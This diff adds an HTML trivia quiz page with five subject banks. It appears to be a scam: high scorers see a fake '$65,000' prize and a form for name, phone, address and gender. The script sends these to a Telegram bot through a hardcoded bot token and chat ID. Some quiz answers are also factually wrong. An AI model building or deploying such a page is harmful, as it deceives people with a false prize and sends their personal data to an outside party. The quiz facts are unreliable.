@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Ultimate Quiz Challenge</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #141e30, #243b55);
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px;
+    }
+    #app {
+      max-width: 800px;
+      width: 100%;
+      background: #1e2a38;
+      border-radius: 10px;
+      padding: 20px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+      animation: fadeIn 1s ease-in-out;
+    }
+    .question-container {
+      margin-top: 20px;
+    }
+    .question {
+      font-size: 1.3rem;
+      margin-bottom: 15px;
+    }
+    .options button {
+      width: 100%;
+      margin: 5px 0;
+      padding: 12px;
+      font-size: 1rem;
+      border: none;
+      border-radius: 6px;
+      background-color: #34495e;
+      color: white;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    .options button:hover {
+      background-color: #00c6ff;
+      color: black;
+      transform: scale(1.02);
+    }
+    .hidden {
+      display: none;
+    }
+    .timer {
+      font-size: 1.2rem;
+      font-weight: bold;
+      background: #000;
+      padding: 10px 20px;
+      border-radius: 6px;
+      margin-top: 10px;
+    }
+    .crazy-scoreboard {
+      animation: explode 1s ease-in-out infinite alternate;
+      font-size: 2rem;
+      color: lime;
+      text-shadow: 0 0 10px #0f0, 0 0 20px #0f0;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes explode {
+      0% { transform: scale(1); }
+      100% { transform: scale(1.05) rotate(1deg); }
+    }
+
+    .crazy-loader {
+      margin-top: 40px;
+      height: 20px;
+      width: 100%;
+      background: #444;
+      overflow: hidden;
+      position: relative;
+    }
+    .crazy-loader::after {
+      content: '';
+      width: 30%;
+      height: 100%;
+      background: linear-gradient(to right, #00c6ff, #0072ff);
+      position: absolute;
+      left: -30%;
+      animation: loading 1.5s infinite;
+    }
+    @keyframes loading {
+      0% { left: -30%; }
+      50% { left: 100%; }
+      100% { left: 100%; }
+    }
+  </style>
+</head>
+<body>
+  <div id="app">
+    <h1 style="text-align:center;">Welcome to the Ultimate Quiz!</h1>
+    <div id="quiz"></div>
+    <div id="timer" class="timer">Time Left: 16:00</div>
+  </div>
+
+  <audio id="win-sound" src="https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3"></audio>
+  <audio id="fail-sound" src="https://www.soundjay.com/button/sounds/button-10.mp3"></audio>
+  <audio id="click-sound" src="https://www.soundjay.com/button/sounds/button-16.mp3"></audio>
+  <script>
+let allQuestions = {
+  "Champions League": [
+  { q: "Who won the 2022 UEFA Champions League?", a: ["Liverpool", "Real Madrid", "Man City", "Bayern"], correct: 1 },
+  { q: "Which player has the most Champions League goals?", a: ["Messi", "Lewandowski", "Benzema", "Cristiano Ronaldo"], correct: 3 },
+  { q: "Which club has the most titles?", a: ["Barcelona", "Real Madrid", "Milan", "Chelsea"], correct: 1 },
+  { q: "What year did the Champions League start?", a: ["1955", "1960", "1992", "1980"], correct: 2 },
+  { q: "Who won the 2019 Champions League?", a: ["Tottenham", "Liverpool", "PSG", "Man City"], correct: 1 },
+  { q: "Which club did Ronaldo play for in 2008 UCL final?", a: ["Real Madrid", "Juventus", "Man Utd", "Sporting CP"], correct: 2 },
+  { q: "Which team did Chelsea beat in 2012 final?", a: ["Barcelona", "Bayern", "Man Utd", "Real Madrid"], correct: 1 },
+  { q: "Which nation has produced most UCL-winning clubs?", a: ["Spain", "Italy", "Germany", "England"], correct: 0 },
+  { q: "Which team has lost the most UCL finals?", a: ["Juventus", "Real Madrid", "Barcelona", "PSG"], correct: 0 },
+  { q: "Where was the 2023 final played?", a: ["London", "Istanbul", "Paris", "Rome"], correct: 1 },
+  { q: "Who won the 2020 Champions League?", a: ["PSG", "Bayern", "Man City", "Chelsea"], correct: 1 },
+  { q: "Which player won UCL with three different clubs?", a: ["Di Maria", "Zidane", "Seedorf", "Ronaldinho"], correct: 2 },
+  { q: "Which club is nicknamed 'Los Blancos'?", a: ["Barcelona", "Sevilla", "Real Madrid", "Valencia"], correct: 2 },
+  { q: "Who scored a hat-trick in 2022-23 semi-final?", a: ["Haaland", "Benzema", "Mahrez", "Rodrygo"], correct: 3 },
+  { q: "Which English team won UCL in 1999?", a: ["Arsenal", "Man Utd", "Chelsea", "Liverpool"], correct: 1 },
+  { q: "Who has the most assists in UCL history?", a: ["Cristiano", "Xavi", "Di Maria", "Messi"], correct: 3 },
+  { q: "What color is the Champions League trophy?", a: ["Gold", "Bronze", "Silver", "Platinum"], correct: 2 },
+  { q: "Which club lost the 2021 final?", a: ["Man City", "Chelsea", "PSG", "Atletico"], correct: 0 },
+  { q: "Who is known for the 'La Remontada' comeback?", a: ["Real Madrid", "Barcelona", "PSG", "Bayern"], correct: 1 },
+  { q: "Who has the most clean sheets in UCL?", a: ["Neuer", "Buffon", "Casillas", "Cech"], correct: 2 }
+],
+"US Politics": [
+  { q: "Who is the 46th President of the USA?", a: ["Donald Trump", "Barack Obama", "Joe Biden", "George Bush"], correct: 2 },
+  { q: "Which party is represented by the elephant?", a: ["Democrat", "Republican", "Green", "Libertarian"], correct: 1 },
+  { q: "What's the minimum age to run for President?", a: ["25", "30", "35", "40"], correct: 2 },
+  { q: "How many Senators are there?", a: ["50", "100", "150", "435"], correct: 1 },
+  { q: "What branch interprets laws?", a: ["Executive", "Judicial", "Legislative", "Federal"], correct: 1 },
+  { q: "Who signs bills into law?", a: ["Senator", "President", "Speaker", "Governor"], correct: 1 },
+  { q: "What are the first 10 amendments called?", a: ["Preamble", "Bill of Rights", "Articles", "Constitution"], correct: 1 },
+  { q: "Who was the first female VP?", a: ["Hillary Clinton", "Sarah Palin", "Kamala Harris", "Nancy Pelosi"], correct: 2 },
+  { q: "Which state has the most electoral votes?", a: ["Texas", "Florida", "California", "New York"], correct: 2 },
+  { q: "What does the FBI stand for?", a: ["Federal Bureau of Investigation", "Federal Bank Info", "Freedom Bureau", "Forensic Bureau"], correct: 0 },
+  { q: "How many justices sit on the Supreme Court?", a: ["7", "9", "11", "12"], correct: 1 },
+  { q: "Who was President during the Civil War?", a: ["Lincoln", "Grant", "Roosevelt", "Washington"], correct: 0 },
+  { q: "When do Americans vote for President?", a: ["January", "March", "November", "July"], correct: 2 },
+  { q: "What is the Capitol?", a: ["The President's home", "Congress building", "Court", "Pentagon"], correct: 1 },
+  { q: "Who becomes President if the President dies?", a: ["Senate Leader", "VP", "Speaker", "Chief Justice"], correct: 1 },
+  { q: "Which amendment gave women the right to vote?", a: ["15th", "19th", "21st", "26th"], correct: 1 },
+  { q: "Who appoints Supreme Court Justices?", a: ["Congress", "Senate", "President", "Attorney General"], correct: 2 },
+  { q: "Who was the only US President to resign?", a: ["Nixon", "Ford", "Clinton", "Carter"], correct: 0 },
+  { q: "What year was the Declaration of Independence?", a: ["1770", "1776", "1783", "1800"], correct: 1 },
+  { q: "What is the highest court?", a: ["District", "Appellate", "Supreme", "State"], correct: 2 }
+],
+"Animals": [
+  { q: "Which animal is the largest land mammal?", a: ["Hippo", "Elephant", "Rhino", "Bear"], correct: 1 },
+  { q: "What is a group of lions called?", a: ["Pack", "School", "Pride", "Herd"], correct: 2 },
+  { q: "Which bird is known for mimicry?", a: ["Sparrow", "Owl", "Parrot", "Crow"], correct: 2 },
+  { q: "Which animal sleeps standing up?", a: ["Cow", "Horse", "Sheep", "Dog"], correct: 1 },
+  { q: "What is the fastest land animal?", a: ["Lion", "Cheetah", "Tiger", "Kangaroo"], correct: 1 },
+  { q: "Which animal has a long neck?", a: ["Elephant", "Giraffe", "Camel", "Zebra"], correct: 1 },
+  { q: "Which creature produces honey?", a: ["Bee", "Ant", "Butterfly", "Wasp"], correct: 0 },
+  { q: "What do pandas mostly eat?", a: ["Bamboo", "Fish", "Meat", "Grass"], correct: 0 },
+  { q: "What do you call a baby goat?", a: ["Foal", "Kid", "Cub", "Calf"], correct: 1 },
+  { q: "Which animal is known to laugh?", a: ["Monkey", "Hyena", "Dog", "Tiger"], correct: 1 },
+  { q: "Which animal can fly backwards?", a: ["Owl", "Eagle", "Hummingbird", "Parrot"], correct: 2 },
+  { q: "Which animal can regrow limbs?", a: ["Lizard", "Octopus", "Starfish", "Salamander"], correct: 2 },
+  { q: "What is the largest animal on Earth?", a: ["Elephant", "Whale Shark", "Blue Whale", "Giant Squid"], correct: 2 },
+  { q: "Which animal is cold-blooded?", a: ["Lion", "Frog", "Dog", "Elephant"], correct: 1 },
+  { q: "What color is a polar bear's skin?", a: ["White", "Black", "Pink", "Brown"], correct: 1 },
+  { q: "Which mammal lays eggs?", a: ["Bat", "Kangaroo", "Platypus", "Opossum"], correct: 2 },
+  { q: "What’s the tallest animal?", a: ["Elephant", "Horse", "Giraffe", "Camel"], correct: 2 },
+  { q: "Which animal is known as man's best friend?", a: ["Cat", "Dog", "Horse", "Parrot"], correct: 1 },
+  { q: "Which sea creature has eight arms?", a: ["Octopus", "Crab", "Squid", "Lobster"], correct: 0 },
+  { q: "Which insect has colorful wings?", a: ["Bee", "Butterfly", "Ant", "Wasp"], correct: 1 }
+],
+"USA Hip Hop": [
+  { q: "Who released the album 'The Blueprint'?", a: ["Nas", "Tupac", "Jay-Z", "Kanye West"], correct: 2 },
+  { q: "Which rapper is from Compton?", a: ["J. Cole", "Dr. Dre", "Biggie", "Lil Wayne"], correct: 1 },
+  { q: "Who popularized 'Sicko Mode'?", a: ["Travis Scott", "Drake", "Kendrick", "Offset"], correct: 0 },
+  { q: "Who is known for 'Lose Yourself'?", a: ["Eminem", "Jay-Z", "Nas", "50 Cent"], correct: 0 },
+  { q: "Which rapper founded Aftermath?", a: ["Diddy", "Jay-Z", "Dr. Dre", "Kanye"], correct: 2 },
+  { q: "Who was in the group Outkast?", a: ["Snoop", "Andre 3000", "Nas", "Ice Cube"], correct: 1 },
+  { q: "What city is known as the birthplace of hip hop?", a: ["LA", "Atlanta", "New York", "Detroit"], correct: 2 },
+  { q: "Which artist released 'To Pimp a Butterfly'?", a: ["Kanye", "Kendrick Lamar", "Drake", "Tyler"], correct: 1 },
+  { q: "What label did Tupac sign to?", a: ["Bad Boy", "Death Row", "Roc Nation", "Shady"], correct: 1 },
+  { q: "Which artist had the hit 'God's Plan'?", a: ["Drake", "J. Cole", "Kanye", "Lil Baby"], correct: 0 },
+  { q: "Who released 'Illmatic'?", a: ["Nas", "Jay-Z", "KRS-One", "Rakim"], correct: 0 },
+  { q: "Who is associated with 'Hotline Bling'?", a: ["Drake", "Big Sean", "Tyga", "Future"], correct: 0 },
+  { q: "Which group is known for 'Fight the Power'?", a: ["N.W.A", "Public Enemy", "Wu-Tang", "Run DMC"], correct: 1 },
+  { q: "Which rapper is known as 'Hov'?", a: ["Nas", "Eminem", "Jay-Z", "Kanye"], correct: 2 },
+  { q: "Who won a Pulitzer Prize for hip hop?", a: ["Kendrick", "Drake", "J. Cole", "Kanye"], correct: 0 },
+  { q: "Who is Travis Scott's mentor?", a: ["Jay-Z", "Kanye", "Drake", "Diddy"], correct: 1 },
+  { q: "Which rapper created 'Yeezy'?", a: ["Kanye", "Drake", "Pharrell", "Jay-Z"], correct: 0 },
+  { q: "What duo created 'Watch the Throne'?", a: ["Nas & Jay-Z", "Kanye & Jay-Z", "Drake & Wayne", "Kendrick & Cole"], correct: 1 },
+  { q: "Which rapper had the album 'DAMN.'?", a: ["J. Cole", "Kendrick", "Drake", "Jay-Z"], correct: 1 },
+  { q: "Who rapped 'I got 99 problems but a ___ ain't one'?", a: ["Jay-Z", "Snoop", "Nas", "50 Cent"], correct: 0 }
+],
+
+"Bible": [
+  { q: "Who built the ark?", a: ["Moses", "Noah", "Abraham", "David"], correct: 1 },
+  { q: "Where was Jesus born?", a: ["Jerusalem", "Nazareth", "Bethlehem", "Galilee"], correct: 2 },
+  { q: "Who led the Israelites out of Egypt?", a: ["Aaron", "Moses", "Joshua", "Joseph"], correct: 1 },
+  { q: "How many disciples did Jesus have?", a: ["10", "11", "12", "13"], correct: 2 },
+  { q: "What is the first book of the Bible?", a: ["Exodus", "Genesis", "Leviticus", "Matthew"], correct: 1 },
+  { q: "Who was swallowed by a big fish?", a: ["Elijah", "Jonah", "Peter", "Paul"], correct: 1 },
+  { q: "Who killed Goliath?", a: ["Saul", "Samuel", "David", "Solomon"], correct: 2 },
+  { q: "What did Jesus turn water into?", a: ["Milk", "Wine", "Juice", "Honey"], correct: 1 },
+  { q: "Who betrayed Jesus?", a: ["Peter", "John", "Judas", "Thomas"], correct: 2 },
+  { q: "What is the last book of the Bible?", a: ["Jude", "Revelation", "Acts", "Romans"], correct: 1 },
+  { q: "How many days did God take to create the world?", a: ["5", "6", "7", "8"], correct: 1 },
+  { q: "Who was the strongest man in the Bible?", a: ["David", "Goliath", "Samson", "Saul"], correct: 2 },
+  { q: "Who walked on water with Jesus?", a: ["Peter", "Paul", "James", "John"], correct: 0 },
+  { q: "What did God give Moses on Mount Sinai?", a: ["Ark", "Manna", "10 Commandments", "Fire"], correct: 2 },
+  { q: "What is the Bible’s shortest verse?", a: ["Jesus slept", "Jesus wept", "God is love", "Pray always"], correct: 1 },
+  { q: "Who was the first man?", a: ["Adam", "Moses", "Noah", "Abel"], correct: 0 },
+  { q: "Who wrote many of the Psalms?", a: ["Solomon", "Isaiah", "David", "Elijah"], correct: 2 },
+  { q: "Which apostle was a tax collector?", a: ["Matthew", "James", "Thomas", "Philip"], correct: 0 },
+  { q: "What animal tempted Eve?", a: ["Lion", "Snake", "Donkey", "Goat"], correct: 1 },
+  { q: "Who was thrown into the lions' den?", a: ["Elijah", "Daniel", "Joseph", "David"], correct: 1 }
+]
+};
+
+let userName = "";
+let subject = "";
+let currentQuestionIndex = 0;
+let score = 0;
+let attempts = 0;
+let timeLeft = 960; // 16 minutes
+
+function shuffle(array) {
+  for (let i = array.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [array[i], array[j]] = [array[j], array[i]];
+  }
+}
+
+function startQuiz() {
+  const name = prompt("Enter your full name:");
+  if (!name) return startQuiz();
+  userName = name;
+  subject = prompt("Choose a subject:\n1. Champions League\n2. US Politics\n3. Animals\n4. USA Hip Hop\n5. Bible");
+  if (!["1","2","3","4","5"].includes(subject)) return startQuiz();
+  const subjects = ["Champions League", "US Politics", "Animals", "USA Hip Hop","Bible"];
+  subject = subjects[parseInt(subject) - 1];
+  shuffle(allQuestions[subject]);
+  renderQuestion();
+  startTimer();
+}
+
+function renderQuestion() {
+  if (currentQuestionIndex >= allQuestions[subject].length) {
+    return finishQuiz();
+  }
+  
+  const container = document.getElementById("quiz");
+  const questionData = allQuestions[subject][currentQuestionIndex];
+  container.innerHTML = `
+    <div class="question-container">
+      <div class="question">${currentQuestionIndex + 1}. ${questionData.q}</div>
+      <div class="options">
+        ${questionData.a.map((opt, i) => `
+          <button onclick="selectAnswer(${i})">${String.fromCharCode(65 + i)}. ${opt}</button>
+        `).join('')}
+      </div>
+    </div>
+  `;
+}
+
+function selectAnswer(index) {
+  document.querySelectorAll('.options button').forEach(btn => btn.disabled = true);
+  const correctIndex = allQuestions[subject][currentQuestionIndex].correct;
+
+  const buttons = document.querySelectorAll('.options button');
+  if (index === correctIndex) {
+    buttons[index].style.background = "green";
+    score++;
+    document.getElementById("click-sound").play();
+  } else {
+    buttons[index].style.background = "red";
+    buttons[correctIndex].style.background = "green";
+    document.getElementById("fail-sound").play();
+  }
+
+  setTimeout(() => {
+    currentQuestionIndex++;
+    renderQuestion();
+  }, 1000);
+}
+
+function startTimer() {
+  const timerEl = document.getElementById("timer");
+  const interval = setInterval(() => {
+    if (timeLeft <= 0) {
+      clearInterval(interval);
+      return finishQuiz();
+    }
+    timeLeft--;
+    const min = Math.floor(timeLeft / 60);
+    const sec = timeLeft % 60;
+    timerEl.textContent = `Time Left: ${min}:${sec.toString().padStart(2, '0')}`;
+  }, 1000);
+}
+
+function finishQuiz() {
+  document.getElementById("quiz").innerHTML = "";
+  document.getElementById("timer").style.display = "none";
+
+  const scorePercent = Math.round((score / allQuestions[subject].length) * 100);
+  const app = document.getElementById("app");
+
+  if (scorePercent >= 69) {
+    document.getElementById("win-sound").play();
+    app.innerHTML = `
+      <div class="crazy-scoreboard">
+        Congratulations ${userName}!<br>You scored ${scorePercent}%<br><br>
+        <button onclick="showLoader()">OK</button>
+      </div>
+    `;
+  } else if (scorePercent < 50 && attempts < 1) {
+    attempts++;
+    score = 0;
+    currentQuestionIndex = 0;
+    alert("You didn't pass. Try again!");
+    renderQuestion();
+    startTimer();
+  } else {
+    app.innerHTML = `
+      <div class="crazy-scoreboard" style="color:red;">
+        Sorry ${userName}, you didn't qualify.<br>You scored ${scorePercent}%.<br><br>
+        Redirecting to home...
+      </div>
+    `;
+    setTimeout(() => {
+      location.href = "games.html";
+    }, 5000);
+  }
+}
+
+function showLoader() {
+  document.getElementById("app").innerHTML = `
+    <div class="crazy-loader"></div>
+    <h2 style="text-align:center;">Loading Winner Form...</h2>
+  `;
+  setTimeout(() => {
+    showWinnerForm();
+  }, 3000);
+}
+
+function showWinnerForm() {
+  document.getElementById("app").innerHTML = `
+    <h2 style="text-align:center;">Congratulations! You’ve won $65,000</h2>
+    <form id="winnerForm" style="display:flex;flex-direction:column;gap:15px;">
+      <input type="text" name="fullname" placeholder="Full Name" required style="padding:10px;border-radius:5px;">
+      <input type="tel" name="phone" placeholder="Phone Number" required style="padding:10px;border-radius:5px;">
+      <input type="text" name="address" placeholder="Address" required style="padding:10px;border-radius:5px;">
+      <select name="gender" required style="padding:10px;border-radius:5px;">
+        <option value="">Select Gender</option>
+        <option>Male</option>
+        <option>Female</option>
+        <option>Other</option>
+      </select>
+      <button type="submit" style="padding:12px;background:lime;color:black;border:none;border-radius:5px;font-weight:bold;">Submit</button>
+    </form>
+  `;
+
+  document.getElementById("winnerForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+    const form = new FormData(e.target);
+    const text = `🏆 *Exam Winner* 🏆\n\nName: ${form.get("fullname")}\nPhone: ${form.get("phone")}\nAddress: ${form.get("address")}\nGender: ${form.get("gender")}`;
+
+    // Replace with your actual Telegram bot token and chat ID
+    const TOKEN = "7612075949:AAFYpoGkaGHsFsM00zt1QQkKowiBxDORmr0";
+    const CHAT_ID = "7486773651";
+    const telegramURL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+    fetch(telegramURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text,
+        parse_mode: "Markdown"
+      })
+    }).then(() => {
+      document.getElementById("app").innerHTML = `
+        <h2 style="color:lime;text-align:center;">Submitted Successfully!</h2>
+        <p style="text-align:center;">Redirecting to home...</p>
+      `;
+      setTimeout(() => {
+        location.href = "certificate.html";
+      }, 4000);
+    }).catch(() => {
+      alert("Failed to send. Please check your internet.");
+    });
+  });
+}
+
+startQuiz(); // Start when page loads
+</script>
+</body>
+</html>
